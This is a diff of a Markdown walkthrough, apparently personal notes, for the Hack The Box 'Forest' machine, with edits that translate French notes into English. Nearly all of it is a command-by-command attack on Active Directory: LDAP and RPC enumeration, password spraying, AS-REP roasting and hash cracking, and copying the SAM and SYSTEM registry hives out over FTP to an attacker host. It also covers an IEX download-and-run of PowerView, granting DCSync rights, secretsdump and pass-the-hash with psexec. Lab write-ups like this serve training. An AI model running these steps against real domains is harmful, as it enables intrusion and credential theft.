@@ -2,134 +2,178 @@
 
 # ${{\color{purple}Initial Recon}}\ $
 
-sleep300; nmap -p- -oA fullforst 10.10.10.161
+### NMAP RECON :
 
-smbclient -L 10.10.10.161
+``nmap -sC -sV -oA forest 10.10.10.161``
 
-ldapsearch -h 10.10.10.161 -x 
+``sleep300; nmap -p- -oA fullforst 10.10.10.161``
 
-ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts
+### SMB RECON :
 
-ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" > ldap-anonymous.out
+``smbclient -L 10.10.10.161``
 
-ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i samaccountname
+### LDAP RECON :
 
-ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i userPrincipalName
+``ldapsearch -h 10.10.10.161 -x``
 
-ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i pwdLastSet
+``ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts``
 
-ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' samaccountname userPrincipalName pwdLastSet
+``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" > ldap-anonymous.out``
+
+``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i samaccountname``
+
+``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i userPrincipalName``
+
+``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i pwdLastSet``
+
+``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' samaccountname userPrincipalName pwdLastSet``
 
 > google pwdLastSet ldap to human
 
-https://www.epochconverter.com/ldap
+https://www.epochconverter.com/ldap # Allows to transform data and to know if the accounts are valid 
 
-### transformer les commandes en une liste clean de users et mails :
+### Transform commandes into a clean list of users and mails:
 
-ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap
+``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap`` 
 
-ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' userPrincipalName | grep userPrincipalName | awk '{print $2}' > listmail.ldap
+``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' userPrincipalName | grep userPrincipalName | awk '{print $2}' > listmail.ldap``
 
-rpcclient -U '' -N 10.10.10.161
+### RPC RECON :
 
-enumdomusers
+``rpcclient -U '' -N 10.10.10.161``
 
-queryusergroups 0x47b
+``enumdomusers``
 
-querygroup 0x47c
+``queryusergroups 0x47b``
 
-queryuser svc-alfresco
+``querygroup 0x47c``
 
+``queryuser svc-alfresco``
 
-### recuperer la policy des passwords de l'AD
+### AD passwords policy with CME (crackmapexec) :
 
-crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''
+``crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''``
 
-crackmapexec smb 10.10.10.161 --pass-pol -u 'user.lst' -p 'passwd.lst'
+``crackmapexec smb 10.10.10.161 --pass-pol -u 'user.lst' -p 'passwd.lst'``
 
-password spray avec crackmapexec
+### Password spray with crackmapexec
 
-crackmapexec smb 10.10.10.161 -u 'user.lst' -p 'passwd.lst'
+``crackmapexec smb 10.10.10.161 -u 'user.lst' -p 'passwd.lst'``
 
-/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/       :white_check_mark:
+### Which makes it possible to advance on this box
 
-/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/ -format hashcat
+``/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/``       :white_check_mark:
 
-hashcat --example-hashes | grep -i krb
+``/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/ -format hashcat``
 
-hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt # ippsec ajoute -r rules/InsidePro-PasswordsPro.rule essaye de comprendre pk
+``hashcat --example-hashes | grep -i krb``
+
+``hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt`` # ippsec add -r rules/InsidePro-PasswordsPro.rule try to understand why
 
 
 # ${{\color{purple}Initial Foothold}}\ $
 
+### Test with a valid user :
+ 
+``crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'``
 
-crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
-crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares
-
-#Ici j'aurai pu try un gpp decrypt regarder ce que c'est
-# le port 5985 est important c'est Win-RM (powershell remoting)
-
-locate evil-winrm
-/usr/bin/evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
+``crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares``
 
 # ${{\color{purple}Exploitation}}\ $
 
+### port 5985 is important it is Win-RM (powershell remoting)
+
+``locate evil-winrm``
+
+``/usr/bin/evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161``
+
 # ${{\color{purple}Privilege Escalation}}\ $
 
-find . | grep exe$
-impacket-smbserver idk $(pwd) -smb2support -user user -password idkazewxc123
-$pass = convertto-securestring 'idkazewxc123' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential('ippsec', $pass)
-New-PSDrive -PSProvider FileSystem \\10.10.16.5
+### File transfer with FTP:
+
+``find . | grep exe$``
+
+``impacket-smbserver idk $(pwd) -smb2support -user user -password idkazewxc123``
+
+``$pass = convertto-securestring 'idkazewxc123' -AsPlainText -Force``
+
+``$cred = New-Object System.Management.Automation.PSCredential('HTB\ippsec', $pass)``
+
+``New-PSDrive -PSProvider FileSystem \\10.10.16.5``
 
 
-systemctl restart pure-ftpd
+``systemctl restart pure-ftpd``
 
-echo 'open 10.10.16.5 21'> ftp.txt
-echo 'USER offsec'>> ftp.txt
-echo 'lab'>> ftp.txt
-echo 'bin'>> ftp.txt
-echo 'PUT C:\windows\system32\config\SYSTEM'>> ftp.txt
-echo 'PUT C:\windows\system32\config\SAM'>> ftp.txt
-echo 'PUT C:\windows\system32\config\SECURITY'>> ftp.txt
-echo 'bye'>> ftp.txt
+``echo 'open 10.10.16.5 21'> ftp.txt``
 
-ftp –v –n –s:ftp.txt 
-systemctl stop pure-ftpd
+``echo 'USER offsec'>> ftp.txt``
 
-------------------------------------------
-New-PSDrive -Name ippsec4 -PSProvider FileSystem -Root \\10.10.16.5\test
-cd ippsec4:
-/usr/share/doc/python3-impacket/examples/smbserver.py test /mnt/share -smb2support
+``echo 'lab'>> ftp.txt``
 
-Bloodhound:
-si il y a une install de bloodhound delet :
-rm /usr/share/neo4j/data/dbms/auth
-neo4j console
-neo4j password : sparta-castro-union-labor-pluto-9066
+``echo 'bin'>> ftp.txt``
 
-./BloodHound --no-sandbox
-.\SharpHound.exe -c all
+``echo 'PUT C:\windows\system32\config\SYSTEM'>> ftp.txt``
 
-Bloodhound search :
--Mark User as Owned
--search for Shortest Path from Owned Principals
+``echo 'PUT C:\windows\system32\config\SAM'>> ftp.txt``
 
-net user evil evil123 /add /domain
-net group "Exchange Windows Permissions"
-net group "Exchange Windows Permissions" /add evil
+``echo 'PUT C:\windows\system32\config\SECURITY'>> ftp.txt``
 
-IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:8080/PowerView.ps1')
-$pass = convertto-securestring 'evil123' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential('HTB\evil', $pass)
-Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity evil -Rights DCSync
+``echo 'bye'>> ftp.txt``
 
-/usr/bin/impacket-secretsdump htb.local/evil:evil123@10.10.10.161
-crackmapexec smb 10.10.10.161 -u 'administrator' -H 32693b11e6aa90eb43d32c72a07ceea6
 
-/usr/bin/impacket-psexec -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+
+``ftp –v –n –s:ftp.txt``
+
+``systemctl stop pure-ftpd``
+
+### File transfer with SMB :
+
+``New-PSDrive -Name ippsec4 -PSProvider FileSystem -Root \\10.10.16.5\test``
+
+``cd ippsec4:``
+
+``/usr/share/doc/python3-impacket/examples/smbserver.py test /mnt/share -smb2support``
+
+### Bloodhound :
+
+### if there is an installation of bloodhound and I don't remember the password neo4j delet :
+
+``rm /usr/share/neo4j/data/dbms/auth``
+``neo4j console``
+``neo4j password : sparta-castro-union-labor-pluto-9066``
+
+``./BloodHound --no-sandbox``
+``.\SharpHound.exe -c all``
+
+### Bloodhound search :
+
+``-Mark User as Owned``
+``-Search for Shortest Path from Owned Principals``
+
+``net user evil evil123 /add /domain``
+
+``net group "Exchange Windows Permissions"``
+
+``net group "Exchange Windows Permissions" /add evil``
+
+### File transfer with SMB :
+
+``IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:8080/PowerView.ps1')``
+
+``$pass = convertto-securestring 'evil123' -AsPlainText -Force``
+
+``$cred = New-Object System.Management.Automation.PSCredential('HTB\evil', $pass)``
+
+``Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity evil -Rights DCSync``
+
+``/usr/bin/impacket-secretsdump htb.local/evil:evil123@10.10.10.161``
+
+``crackmapexec smb 10.10.10.161 -u 'administrator' -H 32693b11e6aa90eb43d32c72a07ceea6``
+
+``/usr/bin/impacket-psexec -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161``
 
 # ${{\color{purple}Points of Improvement}}\ $
 
--note ne pas oublier / dans impacket 
-/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/
+- Don't forget / in impacket :
+
+``/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/``
